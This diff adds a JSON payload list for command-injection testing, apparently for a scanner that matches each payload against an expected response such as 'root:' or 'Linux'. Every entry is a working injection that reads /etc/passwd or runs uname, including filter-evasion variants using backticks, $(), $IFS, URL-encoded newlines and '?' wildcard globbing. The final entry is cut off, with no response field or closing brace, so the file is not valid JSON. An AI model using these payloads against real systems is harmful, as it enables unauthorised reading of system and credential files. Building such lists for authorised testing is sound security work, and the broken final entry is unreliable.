@@ -1,0 +1,40 @@
+[
+   {
+      "name":"Command Injection",
+      "payload":"cat /etc/passwd",
+      "response":"root:"
+   },
+   {
+      "name":"Command Injection",
+      "payload":"`cat /etc/passwd`",
+      "response":"root:"
+   },
+   {
+      "name":"Command Injection",
+      "payload":"$(cat /etc/passwd)",
+      "response":"root:"
+   },
+   {
+      "name":"Command Injection",
+      "payload":"cat$IFS/etc/passwd",
+      "response":"root:"
+   },
+   {
+      "name":"Command Injection",
+      "payload":"cat${IFS}/etc/passwd",
+      "response":"root:"
+   },
+   {
+      "name":"Command Injection",
+      "payload":"IFS=,;`cat<<<uname,-a`",
+      "response":"Linux"
+   },
+   {
+      "name":"Command Injection",
+      "payload":"%0Acat%20/etc/passwd",
+      "response":"root:"
+   },
+   {
+      "name":"Command Injection bypass using ? characters",
+      "payload": "/???/??t+/???/??ss??"
+]
